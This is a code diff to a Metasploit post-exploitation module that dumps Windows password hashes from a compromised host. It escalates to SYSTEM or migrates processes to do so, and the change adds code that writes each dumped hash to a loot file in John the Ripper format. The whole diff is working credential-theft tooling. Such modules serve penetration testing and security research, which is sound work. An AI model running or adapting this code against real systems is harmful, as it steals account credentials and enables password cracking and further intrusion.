@@ -73,7 +73,12 @@ class Metasploit3 < Msf::Post
 	# Run Method for when run command is issued
 	def run
 		print_status("Running module against #{sysinfo['Computer']}")
-		smart_hash_dump(datastore['GETSYSTEM'])
+		host = Rex::FileUtils.clean_path(sysinfo["Computer"])
+		hash_file = store_loot("windows.hashes", "text/plain", session, "", "#{host}_hashes.txt", "Windows Hashes")
+		print_status("Hashes will be saved to the Database if one is connected.")
+		print_status("Hashes will be saved in loot in John Password File format to:")
+		print_status(hash_file)
+		smart_hash_dump(datastore['GETSYSTEM'], hash_file)
 	end
     
     
@@ -365,7 +370,7 @@ class Metasploit3 < Msf::Post
     
 	#-------------------------------------------------------------------------------
     
-	def smart_hash_dump(migrate_system)
+	def smart_hash_dump(migrate_system, pwdfile)
 		domain_controler = is_dc?
 		if not is_uac_enabled? or is_admin?
 			print_status("Dumping password hashes...")
@@ -376,6 +381,7 @@ class Metasploit3 < Msf::Post
 					begin
 						inject_hashdump.each_line do |h|
 							print_good("\t#{h}".chomp)
+							file_local_write(pwdfile,h.chomp)
 						end
                         rescue::Exception => e
 						print_error("Failed to dump hashes as SYSTEM, trying to migrate to another process")
@@ -385,6 +391,7 @@ class Metasploit3 < Msf::Post
                             
 							inject_hashdump.each_line do |h|
 								print_good("\t#{h}".chomp)
+								file_local_write(pwdfile,h.chomp)
 							end
                             
                             else
@@ -397,6 +404,7 @@ class Metasploit3 < Msf::Post
 					print_status "Running as SYSTEM extracting hashes from registry"
 					read_hashdump.each_line do |h|
 						print_good("\t#{h.chomp}")
+						file_local_write(pwdfile,h.chomp)
 					end
 				end
                 
@@ -408,6 +416,7 @@ class Metasploit3 < Msf::Post
 					begin
 						inject_hashdump.each_line do |h|
 							print_good("\t#{h}")
+							file_local_write(pwdfile,h.chomp)
 						end
                         rescue
 						if migrate_system
@@ -423,6 +432,7 @@ class Metasploit3 < Msf::Post
 								end
 								inject_hashdump.each_line do |h|
 									print_good("\t#{h}".chomp)
+									file_local_write(pwdfile,h.chomp)
 								end
 							end
                             else
@@ -438,6 +448,7 @@ class Metasploit3 < Msf::Post
 							print_good("Got SYSTEM Privelege")
 							read_hashdump.each_line do |h|
 								print_good("\t#{h.chomp}")
+								file_local_write(pwdfile,h.chomp)
 							end
 						end
                         else
@@ -454,11 +465,13 @@ class Metasploit3 < Msf::Post
 							print_good("Got SYSTEM Privelege")
 							read_hashdump.each_line do |h|
 								print_good("\t#{h.chomp}")
+								file_local_write(pwdfile,h.chomp)
 							end
 						end
                         else
 						inject_hashdump.each_line do |h|
 							print_good("\t#{h}")
+							file_local_write(pwdfile,h.chomp)
 						end
 					end
                     
